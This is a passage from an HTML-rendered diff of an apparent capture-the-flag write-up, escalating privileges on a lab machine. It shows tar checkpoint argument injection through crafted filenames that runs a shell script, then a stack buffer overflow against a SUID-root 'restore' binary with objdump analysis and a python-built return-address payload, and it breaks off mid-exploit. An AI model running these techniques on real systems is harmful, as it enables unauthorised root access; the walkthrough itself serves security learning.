class="s2">&quot;_=/bin/tar&quot;</span><span class="p">])</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span></span>
+<span class="code-line"><span class="p">[</span><span class="n">pid</span><span class="w">  </span><span class="mi">1783</span><span class="p">]</span><span class="w"> </span><span class="n">execve</span><span class="p">(</span><span class="s2">&quot;/usr/local/bin/gzip&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;gzip&quot;</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;TAR_FORMAT=gnu&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_SUBCOMMAND=-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SHELL=/bin/bash&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TERM=unknown&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;OLDPWD=/usr/local/bin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_BLOCKING_FACTOR=20&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;USER=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LS_COLORS=&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_USER=robin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_UID=1000&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;USERNAME=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;MAIL=/var/mail/bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;PWD=/usr/share/nginx/serverchecker/storage&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LANG=en_US.UTF-8&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_CHECKPOINT=1&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;HOME=/home/bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_COMMAND=/usr/local/bin/dice&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SHLVL=14&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LOGNAME=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_VERSION=1.26&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LESSOPEN=||/usr/bin/lesspipe.sh </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_GID=1000&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;_=/bin/tar&quot;</span><span class="p">])</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">-</span><span class="mi">1</span><span class="w"> </span><span class="n">ENOENT</span><span class="w"> </span><span class="p">(</span><span class="n">No</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">directory</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="p">[</span><span class="n">pid</span><span class="w">  </span><span class="mi">1783</span><span class="p">]</span><span class="w"> </span><span class="n">execve</span><span class="p">(</span><span class="s2">&quot;/bin/gzip&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;gzip&quot;</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;TAR_FORMAT=gnu&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_SUBCOMMAND=-c&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SHELL=/bin/bash&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TERM=unknown&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;OLDPWD=/usr/local/bin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_BLOCKING_FACTOR=20&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;USER=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LS_COLORS=&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_USER=robin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_UID=1000&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;USERNAME=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;MAIL=/var/mail/bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;PATH=/usr/local/bin:/bin:/usr/bin:/usr/local/sbin:/usr/sbin&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;PWD=/usr/share/nginx/serverchecker/storage&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LANG=en_US.UTF-8&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_CHECKPOINT=1&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_ARCHIVE=/home/sean/backup_20160312.tar.gz&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;HOME=/home/bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_COMMAND=/usr/local/bin/dice&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SHLVL=14&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LOGNAME=bryan&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;TAR_VERSION=1.26&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;LESSOPEN=||/usr/bin/lesspipe.sh </span><span class="si">%s</span><span class="s2">&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;SUDO_GID=1000&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;_=/bin/tar&quot;</span><span class="p">])</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<ul>
+<li>The <code>-s 999</code> allows to specify the maximum string size to print</li>
+<li>the -v prints more informations</li>
+<li>the -f see the child process calls, you would not see a lot of things without
+  this flag</li>
+</ul>
+<p>We can see that the <code>tar</code> utility is used. We have seen in the previous link
+that we can exploit it using the <code>checkpoint</code>. The backup directory is
+<code>/usr/share/nginx/serverchecker/storage</code>.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="o">[</span><span class="n">bryan@fII bin</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">touch</span><span class="w"> </span><span class="s1">&#39;/usr/share/nginx/serverchecker/storage/--checkpoint=1&#39;</span><span class="w"></span></span>
+<span class="code-line"><span class="o">[</span><span class="n">bryan@fII bin</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">touch</span><span class="w"> </span><span class="s1">&#39;/usr/share/nginx/serverchecker/storage/--checkpoint-action=exec=sh shell.sh&#39;</span><span class="w"></span></span>
+<span class="code-line"><span class="o">[</span><span class="n">bryan@fII bin</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">echo</span><span class="w"> </span><span class="s1">&#39;/bin/sh&#39;</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">serverchecker</span><span class="o">/</span><span class="n">storage</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">sh</span><span class="w"></span></span>
+<span class="code-line"><span class="o">[</span><span class="n">bryan@fII bin</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="o">+</span><span class="n">x</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">serverchecker</span><span class="o">/</span><span class="n">storage</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">sh</span><span class="w"></span></span>
+<span class="code-line"><span class="o">[</span><span class="n">bryan@fII bin</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">al</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">nginx</span><span class="o">/</span><span class="n">serverchecker</span><span class="o">/</span><span class="n">storage</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="n">total</span><span class="w"> </span><span class="mi">20</span><span class="w"></span></span>
+<span class="code-line"><span class="n">drwxrwxrwx</span><span class="p">.</span><span class="w">  </span><span class="mi">5</span><span class="w"> </span><span class="n">nginx</span><span class="w"> </span><span class="n">nginx</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">Mar</span><span class="w"> </span><span class="mi">12</span><span class="w"> </span><span class="mi">11</span><span class="err">:</span><span class="mi">54</span><span class="w"> </span><span class="p">.</span><span class="w"></span></span>
+<span class="code-line"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="p">.</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="n">nginx</span><span class="w"> </span><span class="n">nginx</span><span class="w"> </span><span class="mi">4096</span><span class="w"> </span><span class="n">Jun</span><span class="w"> </span><span class="mi">22</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="p">..</span><span class="w"></span></span>
+<span class="code-line"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="p">.</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="n">nginx</span><span class="w"> </span><span class="n">nginx</span><span class="w">   </span><span class="mi">23</span><span class="w"> </span><span class="n">Jun</span><span class="w"> </span><span class="mi">22</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="n">app</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="n">bryan</span><span class="w"> </span><span class="n">bryan</span><span class="w">    </span><span class="mi">0</span><span class="w"> </span><span class="n">Mar</span><span class="w"> </span><span class="mi">12</span><span class="w"> </span><span class="mi">11</span><span class="err">:</span><span class="mi">52</span><span class="w"> </span><span class="o">--</span><span class="k">checkpoint</span><span class="o">=</span><span class="mi">1</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="n">bryan</span><span class="w"> </span><span class="n">bryan</span><span class="w">    </span><span class="mi">0</span><span class="w"> </span><span class="n">Mar</span><span class="w"> </span><span class="mi">12</span><span class="w"> </span><span class="mi">11</span><span class="err">:</span><span class="mi">53</span><span class="w"> </span><span class="o">--</span><span class="k">checkpoint</span><span class="o">-</span><span class="k">action</span><span class="o">=</span><span class="k">exec</span><span class="o">=</span><span class="n">sh</span><span class="w"> </span><span class="n">shell</span><span class="p">.</span><span class="n">sh</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rwxrwxrwx</span><span class="p">.</span><span class="w">  </span><span class="mi">1</span><span class="w"> </span><span class="n">nginx</span><span class="w"> </span><span class="n">nginx</span><span class="w"> </span><span class="mi">6144</span><span class="w"> </span><span class="n">Feb</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="mi">14</span><span class="err">:</span><span class="mi">40</span><span class="w"> </span><span class="k">database</span><span class="p">.</span><span class="n">sqlite</span><span class="w"></span></span>
+<span class="code-line"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="p">.</span><span class="w">  </span><span class="mi">5</span><span class="w"> </span><span class="n">nginx</span><span class="w"> </span><span class="n">nginx</span><span class="w">   </span><span class="mi">45</span><span class="w"> </span><span class="n">Jun</span><span class="w"> </span><span class="mi">22</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="n">framework</span><span class="w"></span></span>
+<span class="code-line"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="p">.</span><span class="w">  </span><span class="mi">2</span><span class="w"> </span><span class="n">nginx</span><span class="w"> </span><span class="n">nginx</span><span class="w">   </span><span class="mi">39</span><span class="w"> </span><span class="n">Jun</span><span class="w"> </span><span class="mi">22</span><span class="w">  </span><span class="mi">2015</span><span class="w"> </span><span class="n">logs</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="c1">--   1 bryan bryan    8 Mar 12 11:54 shell.s</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>We launch the backup program:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="o">[</span><span class="n">bryan@fII bin</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="k">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="k">backup</span><span class="w"></span></span>
+<span class="code-line"><span class="n">sh</span><span class="o">-</span><span class="mf">4.2</span><span class="err">$</span><span class="w"> </span><span class="n">id</span><span class="w"></span></span>
+<span class="code-line"><span class="n">id</span><span class="w"></span></span>
+<span class="code-line"><span class="n">uid</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">sean</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">bryan</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">sean</span><span class="p">),</span><span class="mi">1001</span><span class="p">(</span><span class="n">bryan</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<h3 id="root-me">root me?</h3>
+<p>Let get us back a real shell:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span></span>
+<span class="code-line"></code></pre></div>
+
+<p>You may need to change the permission of bryan's <code>.bashrc</code> as you can get an
+error about it:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="o">[</span><span class="n">bryan@fII ~</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">chmod</span><span class="w"> </span><span class="mi">777</span><span class="w"> </span><span class="o">~/</span><span class="p">.</span><span class="o">*</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>(Yes I had to exit the shell and start again the operations :/)</p>
+<p>Next we need to use the <code>restore</code> program also in <code>/usr/local/bin/</code> own by root
+with the SUID set and executable by the <code>sean</code> group. First we need to change
+our group (as the one used is <code>bryan</code>).</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>newgrp sean</span>
+<span class="code-line"></code></pre></div>
+
+<p>Let us try the program by creating and empty archive in <code>/tmp/</code>:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="p">[</span><span class="n">sean</span><span class="err">@</span><span class="n">fII</span><span class="w"> </span><span class="n">storage</span><span class="p">]</span><span class="o">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="p">[</span><span class="n">sean</span><span class="err">@</span><span class="n">fII</span><span class="w"> </span><span class="n">tmp</span><span class="p">]</span><span class="o">$</span><span class="w"> </span><span class="n">touch</span><span class="w"> </span><span class="n">backup</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span><span class="w"></span></span>
+<span class="code-line"><span class="p">[</span><span class="n">sean</span><span class="err">@</span><span class="n">fII</span><span class="w"> </span><span class="n">tmp</span><span class="p">]</span><span class="o">$</span><span class="w"> </span><span class="n">cd</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="w"></span></span>
+<span class="code-line"><span class="p">[</span><span class="n">sean</span><span class="err">@</span><span class="n">fII</span><span class="w"> </span><span class="n">bin</span><span class="p">]</span><span class="o">$</span><span class="w"> </span><span class="o">./</span><span class="n">restore</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Restore</span><span class="w"> </span><span class="k">tool</span><span class="w"> </span><span class="n">v0</span><span class="o">.</span><span class="mi">1</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Enter</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">backup</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Path</span><span class="w"> </span><span class="k">is</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Enter</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="n">directory</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Output</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="k">is</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="n">This</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">beta</span><span class="p">,</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">following</span><span class="w"> </span><span class="n">command</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">now</span><span class="p">:</span><span class="w"> </span></span>
+<span class="code-line"><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s2">&quot;/usr/bin/tar xf /tmp/backup.tar.gz -C /tmp/ database.sqlite&quot;</span><span class="w"></span></span>
+<span class="code-line"><span class="n">You</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">currently</span><span class="w"> </span><span class="n">running</span><span class="w"> </span><span class="n">this</span><span class="w"> </span><span class="k">tool</span><span class="w"> </span><span class="k">as</span><span class="p">:</span><span class="w"> </span></span>
+<span class="code-line"><span class="n">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">)</span><span class="w"> </span><span class="n">groups</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="n">root</span><span class="p">),</span><span class="mi">1001</span><span class="p">(</span><span class="n">bryan</span><span class="p">),</span><span class="mi">1002</span><span class="p">(</span><span class="n">sean</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>This looks like we would have to use a buffer overflow the get a root shell as
+the program segfault when the input for the "output directory" is too long:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="p">[</span><span class="n">sean</span><span class="err">@</span><span class="n">fII</span><span class="w"> </span><span class="n">tmp</span><span class="p">]</span><span class="o">$</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">restore</span><span class="w"></span></span>
+<span class="code-line"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">restore</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Restore</span><span class="w"> </span><span class="k">tool</span><span class="w"> </span><span class="n">v0</span><span class="o">.</span><span class="mi">1</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Enter</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">backup</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Path</span><span class="w"> </span><span class="k">is</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Enter</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="n">directory</span><span class="p">:</span><span class="w"> </span><span class="n">qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklqwertyuiopasdfghjklzxcvbnmqwertyuiop</span><span class="w"></span></span>
+<span class="code-line"><span class="n">qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklqwertyuiopasdfghjklzxcvbnmqwertyuiop</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Output</span><span class="w"> </span><span class="n">directory</span><span class="w"> </span><span class="k">is</span><span class="p">:</span><span class="w"> </span><span class="n">qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklqwertyuiopasdfghjklzxcvbnmqwertyuiop</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Segmentation</span><span class="w"> </span><span class="n">fault</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>Let us used objdump to see what we can do and to which address get back in the
+program:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>objdump -d ./restore</span>
+<span class="code-line">[...]</span>
+<span class="code-line">0000000000400fe1 &lt;get_out_path&gt;:</span>
+<span class="code-line">  400fe1:   55                      push   %rbp</span>
+<span class="code-line">  400fe2:   48 89 e5                mov    %rsp,%rbp</span>
+<span class="code-line">  400fe5:   48 83 ec 40             sub    $0x40,%rsp</span>
+<span class="code-line">  400fe9:   bf 77 2b 49 00          mov    $0x492b77,%edi</span>
+<span class="code-line">  400fee:   b8 00 00 00 00          mov    $0x0,%eax</span>
+<span class="code-line">  400ff3:   e8 38 11 00 00          callq  402130 &lt;_IO_printf&gt;</span>
+<span class="code-line">  400ff8:   48 8d 45 c0             lea    -0x40(%rbp),%rax</span>
+<span class="code-line">  400ffc:   48 89 c7                mov    %rax,%rdi</span>
+<span class="code-line">  400fff:   e8 2c 15 00 00          callq  402530 &lt;_IO_gets&gt;</span>
+<span class="code-line">  401004:   48 8d 45 c0             lea    -0x40(%rbp),%rax</span>
+<span class="code-line">  401008:   48 89 c6                mov    %rax,%rsi</span>
+<span class="code-line">  40100b:   bf 94 2b 49 00          mov    $0x492b94,%edi</span>
+<span class="code-line">  401010:   b8 00 00 00 00          mov    $0x0,%eax</span>
+<span class="code-line">  401015:   e8 16 11 00 00          callq  402130 &lt;_IO_printf&gt;</span>
+<span class="code-line">  40101a:   48 8d 45 c0             lea    -0x40(%rbp),%rax</span>
+<span class="code-line">  40101e:   c9                      leaveq </span>
+<span class="code-line">  40101f:   c3                      retq</span>
+<span class="code-line"></code></pre></div>
+
+<p>It looks like the address <code>401f71</code> would give us a shell if we return there with
+the buffer overflow.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>objdump -d ./restore</span>
+<span class="code-line">[...]</span>
+<span class="code-line">  401f15:   eb 93                   jmp    401eaa &lt;do_system+0x29a&gt;</span>
+<span class="code-line">  401f17:   31 d2                   xor    %edx,%edx</span>
+<span class="code-line">  401f19:   be 00 f5 6b 00          mov    $0x6bf500,%esi</span>
+<span class="code-line">  401f1e:   bf 02 00 00 00          mov    $0x2,%edi</span>
+<span class="code-line">  401f23:   48 c7 44 24 30 25 2d    movq   $0x492d25,0x30(%rsp)</span>
+<span class="code-line">  401f2a:   49 00 </span>
+<span class="code-line">  401f2c:   48 c7 44 24 38 1d 2d    movq   $0x492d1d,0x38(%rsp)</span>
+<span class="code-line">  401f33:   49 00 </span>
+<span class="code-line">  401f35:   48 89 6c 24 40          mov    %rbp,0x40(%rsp)</span>
+<span class="code-line">  401f3a:   48 c7 44 24 48 00 00    movq   $0x0,0x48(%rsp)</span>
+<span class="code-line">  401f41:   00 00 </span>
+<span class="code-line">  401f43:   e8 b8 e2 01 00          callq  420200 &lt;__sigaction&gt;</span>
+<span class="code-line">  401f48:   31 d2                   xor    %edx,%edx</span>
+<span class="code-line">  401f4a:   be 60 f4 6b 00          mov    $0x6bf460,%esi</span>
+<span class="code-line">  401f4f:   bf 03 00 00 00          mov    $0x3,%edi</span>
+<span class="code-line">  401f54:   e8 a7 e2 01 00          callq  420200 &lt;__sigaction&gt;</span>
+<span class="code-line">  401f59:   48 8d 74 24 50          lea    0x50(%rsp),%rsi</span>
+<span class="code-line">  401f5e:   31 d2                   xor    %edx,%edx</span>
+<span class="code-line">  401f60:   bf 02 00 00 00          mov    $0x2,%edi</span>
+<span class="code-line">  401f65:   e8 b6 e2 01 00          callq  420220 &lt;__sigprocmask&gt;</span>
+<span class="code-line">  401f6a:   48 8b 15 ff d7 2b 00    mov    0x2bd7ff(%rip),%rdx        # 6bf770 &lt;__environ&gt;</span>
+<span class="code-line">  401f71:   48 8d 74 24 30          lea    0x30(%rsp),%rsi</span>
+<span class="code-line">  401f76:   bf 20 2d 49 00          mov    $0x492d20,%edi</span>
+<span class="code-line">  401f7b:   c7 05 bb d4 2b 00 00    movl   $0x0,0x2bd4bb(%rip)        # 6bf440 &lt;lock&gt;</span>
+<span class="code-line">  401f82:   00 00 00 </span>
+<span class="code-line">  401f85:   c7 05 c1 d4 2b 00 00    movl   $0x0,0x2bd4c1(%rip)        # 6bf450 &lt;sa_refcntr&gt;</span>
+<span class="code-line">  401f8c:   00 00 00 </span>
+<span class="code-line">  401f8f:   e8 9c aa 01 00          callq  41ca30 &lt;__execve&gt;</span>
+<span class="code-line">  401f94:   bf 7f 00 00 00          mov    $0x7f,%edi</span>
+<span class="code-line">  401f99:   e8 32 aa 01 00          callq  41c9d0 &lt;_exit&gt;</span>
+<span class="code-line">  401f9e:   48 c7 c2 c0 ff ff ff    mov    $0xffffffffffffffc0,%rdx</span>
+<span class="code-line">  401fa5:   f7 d8                   neg    %eax</span>
+<span class="code-line"></code></pre></div>
+
+<p>Let us use python to generate the payload encoded in little endian:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="o">[</span><span class="n">sean@fII storage</span><span class="o">]</span><span class="err">$</span><span class="w"> </span><span class="n">python</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s1">&#39;print &quot;A&quot;*72 + &quot;\x71\x1f\x40&quot;&#39;</span><span class="w"></span></span>
+<span class="code-line"><span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>You may need to use another terminal which would not mess up with your input as
+urxvt did. I used tilda for this one. We just need to copy the payload when
+choosing the output directory for the restore program:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="p">[</span><span class="n">sean</span><span class="err">@</span><span class="n">fII</span><span class="w"> </span><span class="n">storage</span><span class="p">]</span><span class="o">$</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">restore</span><span class="w"></span></span>
+<span class="code-line"><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">restore</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Restore</span><span class="w"> </span><span class="k">tool</span><span class="w"> </span><span class="n">v0</span><span class="o">.</span><span class="mi">1</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Enter</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">path</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">backup</span><span class="o">.</span><span class="n">tar</span><span class="o">.</span><span class="n">gz</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Path</span><span class="w"> </span><span class="k">is</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Enter</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="n">directory</span><span class="p">:</span><span class="w"> </span><span class="n">AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAq</span><span class="w"></span></span>
